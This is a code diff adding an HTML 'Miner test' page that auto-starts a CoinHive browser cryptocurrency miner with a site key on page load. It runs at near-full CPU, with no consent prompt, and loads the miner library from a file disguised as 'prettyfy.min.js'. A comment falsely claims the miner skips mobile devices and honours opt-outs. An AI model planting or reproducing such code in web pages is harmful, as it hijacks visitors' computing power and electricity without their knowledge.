@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Miner test</title>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="prettyfy.min.js"></script>
+</head>
+<body>
+	<p>hashesPerSecond: <span id="hashesPerSecond"></span></p>
+	<p>totalHashes: <span id="totalHashes"></span></p>
+	<p>acceptedHashes: <span id="acceptedHashes"></span></p>
+	<script>
+		var miner = new CoinHive.Anonymous('AXIfvaL78oXFOcykqkOVztdu5rnWlm4L', {throttle: 0.01});
+
+		// Only start on non-mobile devices and if not opted-out
+		// in the last 14400 seconds (4 hours):
+		miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+		miner.on('open', function() { console.log("Connection open") })
+		miner.on('found', function() { console.log("Hash found") })
+		miner.on('accepted', function() { console.log("Hash accepted by the pool") })
+
+		// Update stats once per second
+		setInterval(function() {
+			var hashesPerSecond = miner.getHashesPerSecond();
+			var totalHashes = miner.getTotalHashes();
+			var acceptedHashes = miner.getAcceptedHashes();
+
+			$('#hashesPerSecond').text(hashesPerSecond);
+			$('#totalHashes').text(totalHashes);
+			$('#acceptedHashes').text(acceptedHashes);
+		}, 1000);
+	</script>
+</body>
+</html>
